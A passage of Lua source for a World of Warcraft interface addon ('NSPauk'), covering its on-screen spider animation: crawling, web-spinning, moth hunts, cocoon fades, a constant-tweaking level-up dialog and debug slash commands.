        if self.GetMothStuckInfo and not self:GetMothStuckInfo() then
            self:AbortMothHunt(false, false, true)
            return
        end

        if self.CallMoth then
            self:CallMoth("Freeze")
        end

        if S.moth and S.moth.active then
            S.moth.frozen = true
            S.moth.phase = "wrap"
        end

        S.currentTask = task
        task.drop = false

        S.moveDur = 0.2
        S.moveT = 0
        S.lastTaskT = 0
        S.speedTimer = 0
        S.phase = "task"

        self:PutSpider(task.p0.x, task.p0.y)
        return
    end

    S.currentTask = task

    if task.kind ~= "thread" then
        task.drop = false
    end

    local pathLen = self:ApproxThreadLength(task)
    task.pathLength = pathLen

    local len = pathLen
    if len < 1 then
        len = 1
    end

    local speed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX)

    if task.kind == "travel" then
        speed = speed * C.TRAVEL_SPEED_MULT
    end

    if task.isCross then
        speed = speed * C.CROSS_SPEED_MULT
    end

    if task.isMain then
        speed = speed * C.MAIN_SPEED_MULT
    end

    if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
        speed = speed * C.FAST_MODE
    end

    if speed <= 0 then
        speed = 1
    end

    S.moveDur = len / speed

    if S.moveDur < 0.05 then
        S.moveDur = 0.05
    end

    S.moveT = 0
    S.lastTaskT = 0
    S.speedTimer = 0
    S.phase = "task"

    S.lastDropX = task.p0.x
    S.lastDropY = task.p0.y

    self:PutSpider(task.p0.x, task.p0.y)

    if task.drop then
        task.dropSpacing = self:GetWebPointSpacing()
        task.dropRemainder = 0
        self:DropWebForTask(task, task.p0.x, task.p0.y)
    else
        task.dropSpacing = nil
        task.dropRemainder = nil
    end

    if task.nspStartDragTask then
        self:NP_StartDrag(task)
    end

    if task.nspFall then
        if S.spider and S.spider:IsShown() then
            task.p0 = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }

            if task.p2.y > task.p0.y - 1 then
                task.p2 = { x = task.p0.x, y = math.max(0, task.p0.y - 1) }
            else
                task.p2 = { x = task.p0.x, y = task.p2.y }
            end

            task.p1 = { x = task.p0.x, y = (task.p0.y + task.p2.y) / 2 }
        end

        local fallLen = self:ApproxThreadLength(task)
        task.pathLength = fallLen

        if fallLen < 1 then
            fallLen = 1
        end

        local fallMult = math.max(3, (tonumber(C.TRAVEL_SPEED_MULT) or 6) * 0.8)
        local fallSpeed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX) * fallMult

        if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
            fallSpeed = fallSpeed * C.FAST_MODE
        end

        if fallSpeed <= 0 then
            fallSpeed = 1
        end

        S.moveDur = fallLen / fallSpeed

        if S.moveDur < 0.05 then
            S.moveDur = 0.05
        end

        S.moveT = 0
        S.lastTaskT = 0

        self:PutSpider(task.p0.x, task.p0.y)
    end

    if task.nspCrawl or task.nspTempThread then
        if S.spider and S.spider:IsShown() then
            local dx = task.p0.x - S.lastSpiderX
            local dy = task.p0.y - S.lastSpiderY

            if dx * dx + dy * dy > 1 then
                task.p0 = { x = S.lastSpiderX, y = S.lastSpiderY }
                task.p1 = {
                    x = (S.lastSpiderX + task.p2.x) / 2,
                    y = (S.lastSpiderY + task.p2.y) / 2,
                }
                task.pathLength = nil
            end
        end

        if task.nspTempThread then
            task.p1 = { x = task.p0.x, y = (task.p0.y + task.p2.y) / 2 }
            task.p2 = { x = task.p0.x, y = task.p2.y }
            task.pathLength = nil
        end

        local crawlLen = self:ApproxThreadLength(task)
        task.pathLength = crawlLen

        if crawlLen < 1 then
            crawlLen = 1
        end

        local crawlSpeed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX)

        if not task.nspTempThread then
            if task.isCross then
                crawlSpeed = crawlSpeed * (C.CROSS_SPEED_MULT or 1)
            end

            if task.isMain then
                crawlSpeed = crawlSpeed * (C.MAIN_SPEED_MULT or 1)
            end
        end

        if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
            crawlSpeed = crawlSpeed * C.FAST_MODE
        end

        if crawlSpeed <= 0 then
            crawlSpeed = 1
        end

        S.moveDur = crawlLen / crawlSpeed

        if S.moveDur < 0.05 then
            S.moveDur = 0.05
        end

        S.moveT = 0
        S.lastTaskT = 0

        self:PutSpider(task.p0.x, task.p0.y)
    end
end

function NSPauk:ClearAllVisuals()
    local S = self.S

    if S.moth and S.moth.active then
        self:AbortMothHunt(true, true, true)
    end

    S.nspNearCache = nil
    S.nspSupportCache = nil

    self:NP_ClearGlobalDrag(false)
    self:NP_ClearTempOwners()

    if S.currentTask and S.currentTask.nspDragTextures then
        self:RecycleTextures(S.currentTask.nspDragTextures)
        S.currentTask.nspDragTextures = nil
    end

    for _, task in ipairs(S.tasks) do
        if task.nspDragTextures then
            self:RecycleTextures(task.nspDragTextures)
            task.nspDragTextures = nil
        end
    end

    S.nspFrameCache = nil
    S.nspSupportCache = nil
    S.nspLastRoute = nil

    if not S.suppressSettle then
        for _, inst in ipairs(S.instances) do
            self:SettleInstance(inst)
        end
    end

    self:AbortCocoon()
    self:RestoreDigestedFrames()

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            self:RecycleTextures(conn.textures)
            conn.alive = false
        end

        for _, seg in ipairs(inst.crossSegs) do
            self:RecycleTextures(seg.textures)
            seg.alive = false
        end
    end

    for i = #S.fades, 1, -1 do
        self:RecycleTextures(S.fades[i].textures)
        S.fades[i] = nil
    end

    S.instances = {}
    S.currentInstance = nil
    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.webPoints = 0
    S.webAliveCount = 0
    S.mouseOnThread = nil
    S.limitReached = false
    S.limitReturnPending = false
    S.limitCocoonPending = false
    S.limitWaitTimer = 0
    S.limitHomePoint = nil

    self:HideSpider()
end

function NSPauk:OnSpiderClick(button)
    local S = self.S
    local C = self.C

    S.nspNearCache = nil
    S.nspSupportCache = nil

    if button ~= "RightButton" then
        self:NP_ClearGlobalDrag(false)
        self:NP_ClearTempOwners()

        if S.currentTask and S.currentTask.nspDragTextures then
            self:RecycleTextures(S.currentTask.nspDragTextures)
            S.currentTask.nspDragTextures = nil
        end

        for _, task in ipairs(S.tasks) do
            if task.nspDragTextures then
                self:RecycleTextures(task.nspDragTextures)
                task.nspDragTextures = nil
            end
        end

        S.nspFrameCache = nil
        S.nspSupportCache = nil
        S.nspLastRoute = nil
    end

    if button == "RightButton" then
        self:ShowProgress()
        return
    end

    if S.moth and S.moth.active then
        self:AbortMothHunt(true, true, true)
    end

    if S.phase ~= "task"
        and S.phase ~= "instanceComplete"
        and S.phase ~= "dissolve"
        and S.phase ~= "limitWait"
        and S.phase ~= "mothEat" then
        return
    end

    if PlaySoundFile then
        PlaySoundFile(C.CLICK_SOUND)
    end

    S.suppressSettle = true

    self:AnnounceSpiderKill()
    self:ResetProgress()
    self:ResetConstants()
    self:AbortCocoon()
    self:RestoreDigestedFrames()

    S.limitReached = false
    S.limitReturnPending = false
    S.limitCocoonPending = false
    S.limitWaitTimer = 0
    S.limitHomePoint = nil

    local textures = {}

    local function addList(list)
        for _, texture in ipairs(list) do
            if texture and texture:IsShown() then
                textures[#textures + 1] = texture
            end
        end
    end

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            addList(conn.textures)
        end

        for _, seg in ipairs(inst.crossSegs) do
            addList(seg.textures)
        end
    end

    for _, fade in ipairs(S.fades) do
        addList(fade.textures)
    end

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            conn.textures = {}
        end

        for _, seg in ipairs(inst.crossSegs) do
            seg.textures = {}
        end
    end

    for i = #S.fades, 1, -1 do
        S.fades[i] = nil
    end

    local pxxx = S.activeFrame:CreateTexture(nil, "OVERLAY")
    pxxx:SetTexture(C.CLICK_TEX)
    pxxx:SetWidth(C.SPIDER_SIZE * 4)
    pxxx:SetHeight(C.SPIDER_SIZE * 4)
    pxxx:SetPoint("CENTER", UIParent, "BOTTOMLEFT", S.lastSpiderX, S.lastSpiderY)
    pxxx:SetDrawLayer("OVERLAY")
    pxxx:SetAlpha(1)

    S.webCreated = S.webCreated + 1

    textures[#textures + 1] = pxxx

    S.instances = {}
    S.currentInstance = nil
    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.mouseOnThread = nil
    S.webPoints = 0

    self:HideSpider()

    self:AddFade(textures, C.FADE_DURATION, function(addon)
        addon:FinishClickFade()
    end)

    S.phase = "fade"
    S.speedTimer = 0
    S.suppressSettle = false
end

function NSPauk:OnUpdate(dt)
    local S = self.S
    local C = self.C

    if S.phase == "init" then
        S.initTimer = S.initTimer + dt

        if S.initTimer >= C.DELAY_AFTER_LOGIN then
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    if S.phase ~= "fade" and S.phase ~= "disabled" then
        self:UpdateFades(dt)
    end

    if S.moth
        and S.moth.active
        and S.phase ~= "fade"
        and S.phase ~= "disabled"
        and S.phase ~= "mothEat" then

        local abort = false

        if S.moth.inst and (S.moth.inst.torn or not self:InstanceHasAliveConn(S.moth.inst)) then
            abort = true
        end

        if not S.moth.frozen and not self:GetMothStuckInfo() then
            abort = true
        end

        if abort then
            self:AbortMothHunt(false, false, true)
            return
        end
    end

    if S.phase == "watch"
        or S.phase == "task"
        or S.phase == "instanceComplete"
        or S.phase == "dissolve"
        or S.phase == "limitWait"
        or S.phase == "mothEat" then

        S.monitorTimer = S.monitorTimer + dt

        if S.monitorTimer >= C.MONITOR_CHECK then
            S.monitorTimer = 0
            self:CheckInstancesMovement()
        end
    end

    if S.phase == "task"
        or S.phase == "instanceComplete"
        or S.phase == "dissolve"
        or S.phase == "limitWait"
        or S.phase == "mothEat" then
        self:CheckMouseThreads(dt)
    end

    if S.phase == "watch" then
        self:CheckMothHunt(dt)

        if S.moth and S.moth.active then
            return
        end

        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                S.stillTimer = 0
            else
                S.stillTimer = S.stillTimer + C.SPEED_CHECK

                if S.stillTimer >= C.STILL_WAIT then
                    self:StartNewInstance(nil)
                end
            end
        end

        return
    end

    if S.phase == "task" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:Interrupt()
                return
            end
        end

        self:CheckMothHunt(dt)

        if S.phase ~= "task" then
            return
        end

        local task = S.currentTask

        if not task or not self:IsTaskValid(task) then
            self:AdvanceTask()
            return
        end

        if not S.moveDur or S.moveDur <= 0 then
            S.moveDur = 0.08
        end

        S.moveT = S.moveT + (dt / S.moveDur)

        if S.moveT > 1 then
            S.moveT = 1
        end

        local x, y = self:BzThread(task, S.moveT)
        self:PutSpider(x, y)

        if task.kind == "thread" and task.drop then
            self:DropAlongCurve(task, S.lastTaskT or 0, S.moveT)
            S.lastTaskT = S.moveT

            if self:CheckPointLimit() then
                return
            end
        else
            S.lastTaskT = S.moveT
        end

        if S.moveT >= 1 then
            self:AdvanceTask()
        end

        return
    end

    if S.phase == "instanceComplete" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:Interrupt()
                return
            end
        end

        if S.currentInstance and S.currentInstance.isMoth then
            if S.moth and S.moth.active then
                self:BeginMothEat()
                return
            end

            self:TearInstance(S.currentInstance)
            S.currentInstance = nil
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
            return
        end

        if self:CheckPointLimit() then
            return
        end

        self:CheckMothHunt(dt)

        if S.phase ~= "instanceComplete" then
            return
        end

        S.completeTimer = S.completeTimer + dt

        if S.completeTimer >= C.COMPLETE_PAUSE then
            if S.currentInstance and S.currentInstance.isCocoon then
                self:BeginDissolve(S.currentInstance)
            else
                local nextHub = self:ChooseNextHub(S.currentInstance)
                self:StartNewInstance(nextHub)
            end
        end

        return
    end

    if S.phase == "dissolve" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:Interrupt()
                return
            end
        end

        local c = S.cocoon

        if not c then
            if S.limitReached or S.limitCocoonPending then
                self:ReturnToLimitHome()
            else
                S.phase = "watch"
                S.stillTimer = 0
                S.speedTimer = 0
            end

            return
        end

        if not self:InstanceHasAliveConn(c.inst) then
            self:AbortCocoon()

            if S.phase ~= "limitWait" and not S.limitReturnPending then
                if S.limitReached then
                    self:ReturnToLimitHome()
                else
                    S.phase = "watch"
                    S.stillTimer = 0
                    S.speedTimer = 0
                end
            end

            return
        end

        c.timer = c.timer + dt

        local progress = c.timer / c.duration

        if progress > 1 then
            progress = 1
        end

        local alpha = c.baseAlpha * (1 - progress)
        local minAlpha = c.minAlpha or C.MIN_COCOON_ALPHA

        if alpha < minAlpha then
            alpha = minAlpha
        end

        if c.frame and c.frame.SetAlpha then
            c.frame:SetAlpha(alpha)
        end

        if c.inst then
            self:SetInstanceWebAlpha(c.inst, C.WEB_ALPHA * (1 - progress))
        end

        if progress >= 1 then
            self:FinishCocoonDigestion()
        end

        return
    end

    if S.phase == "limitWait" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:Interrupt()
                return
            end
        end

        if not S.spider or not S.spider:IsShown() then
            self:MkSpider()
            self:MkClickBtn()

            if S.limitHomePoint and S.limitHomePoint.x and S.limitHomePoint.y then
                self:PutSpider(S.limitHomePoint.x, S.limitHomePoint.y)
            end
        end

        S.limitWaitTimer = (S.limitWaitTimer or 0) + dt

        local interval = tonumber(C.LIMIT_COCOON_INTERVAL) or 1800

        if S.limitWaitTimer >= interval then
            S.limitWaitTimer = 0
            self:StartLimitCocoon()
        end

        return
    end

    if S.phase == "mothEat" then
        self:UpdateMothEat(dt)
        return
    end

    if S.phase == "fade" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:ClearAllVisuals()
                S.phase = "disabled"
                S.disableTimer = 0
                return
            end
        end

        self:UpdateFades(dt)
        return
    end

    if S.phase == "disabled" then
        S.disableTimer = S.disableTimer + dt

        if S.disableTimer >= C.DISABLE_TIME then
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
            S.disableTimer = 0
        end

        return
    end
end

function NSPauk:FormatConstantValue(key, value)
    if type(value) ~= "number" then
        return tostring(value)
    end

    if math.floor(value) == value then
        return tostring(math.floor(value))
    end

    return string.format("%.3f", value)
end

function NSPauk:ClampConstant(key, old, new)
    if type(new) ~= "number" or new ~= new then
        return old
    end

    local def = self.DefaultConstants[key]

    if type(def) ~= "number" then
        return new
    end

    if def > 0 and new <= 0 then
        new = def * 0.01

        if new <= 0 then
            new = 0.0001
        end
    end

    if key:find("ALPHA", 1, true)
        or key:find("CHANCE", 1, true)
        or key:find("PERCENT", 1, true) then
        if new < 0 then
            new = 0
        end

        if new > 1 then
            new = 1
        end
    end

    if key == "TARGET_COUNT_MIN" and type(self.C.TARGET_COUNT_MAX) == "number" and new > self.C.TARGET_COUNT_MAX then
        new = self.C.TARGET_COUNT_MAX
    elseif key == "TARGET_COUNT_MAX" and type(self.C.TARGET_COUNT_MIN) == "number" and new < self.C.TARGET_COUNT_MIN then
        new = self.C.TARGET_COUNT_MIN
    end

    if key == "SPIDER_SPEED_MIN" and type(self.C.SPIDER_SPEED_MAX) == "number" and new > self.C.SPIDER_SPEED_MAX then
        new = self.C.SPIDER_SPEED_MAX
    elseif key == "SPIDER_SPEED_MAX" and type(self.C.SPIDER_SPEED_MIN) == "number" and new < self.C.SPIDER_SPEED_MIN then
        new = self.C.SPIDER_SPEED_MIN
    end

    if key == "POINTS_PER_LEVEL" and new < 1 then
        new = 1
    end

    if key == "SESSION_FULL_POINTS" and new < 1 then
        new = 1
    end

    if key == "LIMIT_COCOON_INTERVAL" and new < 1 then
        new = 1
    end

    if key == "LIMIT_COCOON_RETRY" and new < 1 then
        new = 1
    end

    return new
end

function NSPauk:AdjustConstant(key, direction)
    local db = self:EnsureDB()
    local C = self.C
    local old = C[key]

    if type(old) ~= "number" then
        return
    end

    local pct = self:RandomFloat(0.001, 0.05)
    local base = math.abs(old)

    if base == 0 then
        base = 1
    end

    local delta = base * pct

    if delta == 0 then
        delta = 0.001
    end

    local new = old

    if direction > 0 then
        new = old + delta
    else
        new = old - delta
    end

    new = self:ClampConstant(key, old, new)

    C[key] = new

    if db.constants then
        db.constants[key] = new
    end

    self:ApplyRuntimeConstants()
end

function NSPauk:HideLevelUpFrame()
    if self.levelUpFrame then
        self.levelUpFrame:Hide()
    end
end

function NSPauk:ShowLevelUpFrame()
    self:CreateLevelUpFrame()

    if not self.levelUpFrame then
        return
    end

    for _, row in ipairs(self.levelUpRows or {}) do
        if row.value then
            row.value:SetText(self:FormatConstantValue(row.key, self.C[row.key]))
        end
    end

    if self.levelUpScroll then
        self.levelUpScroll:SetVerticalScroll(0)
    end

    self.levelUpFrame:Show()
end

function NSPauk:CreateLevelUpFrame()
    if self.levelUpFrame then
        return
    end

    local f = CreateFrame("Frame", "NSPauk_LevelUpFrame", UIParent)

    f:SetWidth(460)
    f:SetHeight(420)
    f:SetPoint("CENTER")
    f:SetFrameStrata("DIALOG")
    f:SetFrameLevel(120)
    f:EnableMouse(true)
    f:SetMovable(true)
    f:SetClampedToScreen(true)
    f:RegisterForDrag("LeftButton")

    f:SetScript("OnDragStart", function(frame)
        frame:StartMoving()
    end)

    f:SetScript("OnDragStop", function(frame)
        frame:StopMovingOrSizing()
    end)

    f:Hide()

    if type(UISpecialFrames) == "table" and f:GetName() then
        table.insert(UISpecialFrames, f:GetName())
    end

    local function setColor(tex, r, g, b, a)
        if not tex then
            return
        end

        if tex.SetColorTexture then
            tex:SetColorTexture(r, g, b, a or 1)
        else
            tex:SetTexture(1, 1, 1, 1)
            tex:SetVertexColor(r, g, b, a or 1)
        end
    end

    local bg = f:CreateTexture(nil, "BACKGROUND")
    bg:SetAllPoints(f)
    setColor(bg, 0.06, 0.06, 0.10, 0.94)

    local title = f:CreateFontString(nil, "OVERLAY", "GameFontHighlightLarge")
    title:SetPoint("TOP", 0, -12)
    title:SetText("Павук: новый уровень!")

    local closeBtn = CreateFrame("Button", nil, f)
    closeBtn:SetWidth(24)
    closeBtn:SetHeight(24)
    closeBtn:SetPoint("TOPRIGHT", -8, -8)
    closeBtn:EnableMouse(true)

    local closeBg = closeBtn:CreateTexture(nil, "BACKGROUND")
    closeBg:SetAllPoints(closeBtn)
    setColor(closeBg, 0.35, 0.10, 0.10, 1)

    local closeText = closeBtn:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
    closeText:SetPoint("CENTER")
    closeText:SetText("X")

    closeBtn:SetScript("OnClick", function()
        self:HideLevelUpFrame()
    end)

    local scroll = CreateFrame("ScrollFrame", nil, f)
    scroll:SetPoint("TOPLEFT", 14, -42)
    scroll:SetPoint("BOTTOMRIGHT", -18, 14)

    local child = CreateFrame("Frame", nil, scroll)
    child:SetWidth(410)

    scroll:SetScrollChild(child)
    scroll:EnableMouseWheel(true)

    scroll:SetScript("OnMouseWheel", function(frame, delta)
        local current = frame:GetVerticalScroll()
        local maxScroll = frame:GetVerticalScrollRange()
        local newScroll = current - (delta * 20)

        if newScroll < 0 then
            newScroll = 0
        end

        if newScroll > maxScroll then
            newScroll = maxScroll
        end

        frame:SetVerticalScroll(newScroll)
    end)

    self.levelUpFrame = f
    self.levelUpScroll = scroll
    self.levelUpChild = child
    self.levelUpRows = {}

    local keys = {}

    for key in pairs(self.DefaultConstants) do
        keys[#keys + 1] = key
    end

    table.sort(keys)

    local rowHeight = 22

    for i, key in ipairs(keys) do
        local row = CreateFrame("Frame", nil, child)
        row:SetHeight(rowHeight)
        row:SetPoint("TOPLEFT", child, "TOPLEFT", 0, -((i - 1) * rowHeight))
        row:SetPoint("RIGHT", child, "RIGHT", 0, 0)

        local nameText = row:CreateFontString(nil, "OVERLAY", "GameFontHighlightSmall")
        nameText:SetPoint("LEFT", 0, 0)
        nameText:SetJustifyH("LEFT")
        nameText:SetWidth(240)
        nameText:SetText(key)

        local minus = CreateFrame("Button", nil, row)
        minus:SetWidth(22)
        minus:SetHeight(22)
        minus:SetPoint("RIGHT", row, "RIGHT", 0, 0)
        minus:EnableMouse(true)

        local minusBg = minus:CreateTexture(nil, "BACKGROUND")
        minusBg:SetAllPoints(minus)
        setColor(minusBg, 0.22, 0.22, 0.28, 1)

        local minusText = minus:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
        minusText:SetPoint("CENTER")
        minusText:SetText("-")

        local plus = CreateFrame("Button", nil, row)
        plus:SetWidth(22)
        plus:SetHeight(22)
        plus:SetPoint("RIGHT", minus, "LEFT", -4, 0)
        plus:EnableMouse(true)

        local plusBg = plus:CreateTexture(nil, "BACKGROUND")
        plusBg:SetAllPoints(plus)
        setColor(plusBg, 0.22, 0.30, 0.22, 1)

        local plusText = plus:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
        plusText:SetPoint("CENTER")
        plusText:SetText("+")

        local valueText = row:CreateFontString(nil, "OVERLAY", "GameFontHighlightSmall")
        valueText:SetPoint("RIGHT", plus, "LEFT", -8, 0)
        valueText:SetJustifyH("RIGHT")
        valueText:SetWidth(90)

        row.key = key
        row.value = valueText

        minus:SetScript("OnClick", function()
            self:AdjustConstant(key, -1)
            self:HideLevelUpFrame()
        end)

        plus:SetScript("OnClick", function()
            self:AdjustConstant(key, 1)
            self:HideLevelUpFrame()
        end)

        self.levelUpRows[#self.levelUpRows + 1] = row
    end

    child:SetHeight(#keys * rowHeight + 10)
end

function NSPauk:OnEvent()
    self:LoadConstants()
    self.S.SW, self.S.SH = self:GetScreenSize()
end

function NSPauk:IsActiveAnchorFrame(frame)
    if not frame then
        return false
    end

    local S = self.S

    for _, inst in ipairs(S.instances) do
        if self:InstanceHasAliveConn(inst) then
            if inst.hub and inst.hub.frame == frame then
                return true
            end

            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.target and conn.target.frame == frame then
                    return true
                end
            end
        end
    end

    if S.cocoon and S.cocoon.frame == frame then
        return true
    end

    return false
end

function NSPauk:PickLimitCocoonVictim(items)
    local minWidth = tonumber(self.C.COCOON_MIN_WIDTH) or 30
    local cand = {}

    for _, item in ipairs(items or {}) do
        if item.frame
            and self:IsGoodAnchorName(item.name)
            and not self:IsActiveAnchorFrame(item.frame)
            and (item.width or 0) > minWidth then
            cand[#cand + 1] = item
        end
    end

    if #cand == 0 then
        return nil
    end

    return cand[self:RandomInt(1, #cand)]
end

function NSPauk:ChooseLimitHomePoint()
    local S = self.S
    local pts = {}

    for _, inst in ipairs(S.instances) do
        if self:InstanceHasAliveConn(inst) and inst.hub then
            if inst.hub.frame then
                local cur = self:ComputeFrameVisibleInner(inst.hub.frame)

                if cur then
                    pts[#pts + 1] = { x = cur.cx, y = cur.cy }
                end
            end

            if inst.hub.rect and inst.hub.rect.cx and inst.hub.rect.cy then
                pts[#pts + 1] = { x = inst.hub.rect.cx, y = inst.hub.rect.cy }
            end
        end
    end

    if #pts > 0 then
        return pts[self:RandomInt(1, #pts)]
    end

    if S.limitHomePoint and S.limitHomePoint.x and S.limitHomePoint.y then
        return { x = S.limitHomePoint.x, y = S.limitHomePoint.y }
    end

    local sw, sh = self:GetScreenSize()

    return { x = sw / 2, y = sh / 2 }
end

function NSPauk:EnterLimitIdle()
    local S = self.S

    if S.limitReached then
        return
    end

    S.limitReached = true
    S.limitCocoonPending = false
    S.limitReturnPending = true
    S.limitWaitTimer = 0

    for _, inst in ipairs(S.instances) do
        self:SettleInstance(inst)
    end

    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    local home = self:ChooseLimitHomePoint()
    S.limitHomePoint = home

    self:MkSpider()
    self:MkClickBtn()

    local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }

    local travel = {
        kind = "travel",
        drop = false,
        p0 = from,
        p1 = {
            x = (from.x + home.x) / 2,
            y = (from.y + home.y) / 2,
        },
        p2 = { x = home.x, y = home.y },
    }

    S.tasks = { travel }
    S.taskIdx = 1
    S.currentTask = nil

    self:AdvanceTask()
end

function NSPauk:CheckPointLimit()
    local S = self.S
    local C = self.C
    local t = S.currentTask

    if t and (t.nspTempThread or t.nspFall) then
        return false
    end

    if S.phase == "task" and t and t.nspDuringDrag and not t.nspDragEnd then
        return false
    end

    if S.limitReached or S.limitReturnPending or S.limitCocoonPending then
        return false
    end

    if S.phase ~= "task" and S.phase ~= "instanceComplete" then
        return false
    end

    if S.currentInstance and S.currentInstance.isCocoon then
        return false
    end

    if S.cocoon then
        return false
    end

    local max = tonumber(C.MAX_WEB_SEGS) or 0

    if max <= 0 then
        return false
    end

    if (S.webAliveCount or 0) >= max then
        self:EnterLimitIdle()
        return true
    end

    return false
end

function NSPauk:StartLimitCocoon()
    local S = self.S
    local C = self.C

    local items = self:CollectVisibleItems()
    local victim = self:PickLimitCocoonVictim(items)

    if not victim then
        S.phase = "limitWait"

        local interval = tonumber(C.LIMIT_COCOON_INTERVAL) or 1800
        local retry = tonumber(C.LIMIT_COCOON_RETRY) or 60

        S.limitWaitTimer = math.max(0, interval - retry)

        return
    end

    S.limitCocoonPending = true

    self:StartCocoon(victim)
end

function NSPauk:ReturnToLimitHome()
    local S = self.S

    S.limitReached = true
    S.limitCocoonPending = false
    S.limitReturnPending = true
    S.limitWaitTimer = 0

    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    local home = self:ChooseLimitHomePoint()
    S.limitHomePoint = home

    self:MkSpider()
    self:MkClickBtn()

    local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }

    local travel = {
        kind = "travel",
        drop = false,
        p0 = from,
        p1 = {
            x = (from.x + home.x) / 2,
            y = (from.y + home.y) / 2,
        },
        p2 = { x = home.x, y = home.y },
    }

    S.tasks = { travel }
    S.taskIdx = 1
    S.currentTask = nil

    self:AdvanceTask()
end

function NSPauk:Init()
    if self.initialized then
        return
    end

    self.initialized = true

    self:LoadConstants()

    local C = self.C
    local S = self.S

    S.SW, S.SH = self:GetScreenSize()

    S.webAliveCount = 0
    S.limitReached = false
    S.limitReturnPending = false
    S.limitCocoonPending = false
    S.limitWaitTimer = 0
    S.limitHomePoint = nil

    self.F_HIGH = CreateFrame("Frame", C.ADDON .. "_WebHigh", UIParent)
    self.F_HIGH:SetAllPoints(UIParent)
    self.F_HIGH:SetFrameStrata("TOOLTIP")
    self.F_HIGH:SetFrameLevel(100)
    self.F_HIGH:EnableMouse(false)
    self.F_HIGH:Show()

    S.activeFrame = self.F_HIGH

    self.F_SPIDER = CreateFrame("Frame", C.ADDON .. "_SpiderHigh", UIParent)
    self.F_SPIDER:SetAllPoints(UIParent)
    self.F_SPIDER:SetFrameStrata("TOOLTIP")
    self.F_SPIDER:SetFrameLevel(101)
    self.F_SPIDER:EnableMouse(false)
    self.F_SPIDER:Show()

    S.spiderFrame = self.F_SPIDER

    self.F_CLICK = CreateFrame("Frame", C.ADDON .. "_ClickHigh", UIParent)
    self.F_CLICK:SetAllPoints(UIParent)
    self.F_CLICK:SetFrameStrata("TOOLTIP")
    self.F_CLICK:SetFrameLevel(102)
    self.F_CLICK:EnableMouse(false)
    self.F_CLICK:Show()

    S.clickFrame = self.F_CLICK

    if type(C.EXCLUDE_FRAMES) ~= "table" then
        C.EXCLUDE_FRAMES = {}
    end

    C.EXCLUDE_FRAMES[C.ADDON .. "_WebHigh"] = true
    C.EXCLUDE_FRAMES[C.ADDON .. "_SpiderHigh"] = true
    C.EXCLUDE_FRAMES[C.ADDON .. "_ClickHigh"] = true

    self.F_HIGH:SetScript("OnUpdate", function(frame, dt)
        NSPauk:OnUpdate(dt)
    end)

    if self.F_HIGH.HookScript then
        self.F_HIGH:HookScript("OnUpdate", function()
            NSPauk:NP_PostUpdate()
        end)
    end

    self.eventFrame = CreateFrame("Frame")
    self.eventFrame:RegisterEvent("PLAYER_LOGIN")
    self.eventFrame:RegisterEvent("PLAYER_ENTERING_WORLD")
    self.eventFrame:SetScript("OnEvent", function(frame, event)
        NSPauk:OnEvent(event)
    end)
end

NSPauk.Modes = {}
NSPauk.BaseMethods = {}

for name, value in pairs(NSPauk) do
    if type(value) == "function" then
        NSPauk.BaseMethods[name] = value
    end
end

NSPauk.Modes.base = NSPauk.BaseMethods

function NSPauk:RegisterMode(name, methods)
    if type(name) ~= "string" or type(methods) ~= "table" then
        return
    end

    self.Modes[name] = methods
end

function NSPauk:SetMode(name)
    if not self.Modes or not self.Modes[name] then
        name = "base"
    end

    self.S.mode = name

    for key, value in pairs(self.BaseMethods) do
        self[key] = value
    end

    if name ~= "base" then
        for key, value in pairs(self.Modes[name]) do
            if type(value) == "function" then
                self[key] = value
            end
        end
    end
end

function NSPauk:GetMode()
    return self.S.mode
end

function NSPauk:CallBase(name, ...)
    local func = self.BaseMethods[name]

    if func then
        return func(self, ...)
    end
end

NSPauk:LoadConstants()
NSPauk:SetMode("base")
NSPauk:Init()

NSPauk.__nspMapCrawlPatch = true
NSPauk.__nspMapCrawlPatch2 = true
NSPauk.__nspMapCrawlPatch5 = true
NSPauk.__nspMapCrawlPatch6 = true

if type(SlashCmdList) == "table" then
    local cmdName = "NSPAUKCRAWLDEBUG"

    if not SlashCmdList[cmdName] then
        SlashCmdList[cmdName] = function()
            NSPauk:NP_DebugPrint()
        end

        if _G then
            _G["SLASH_" .. cmdName .. "1"] = "/nspmap"
            _G["SLASH_" .. cmdName .. "2"] = "/paukmap"
        end
    end
end













do
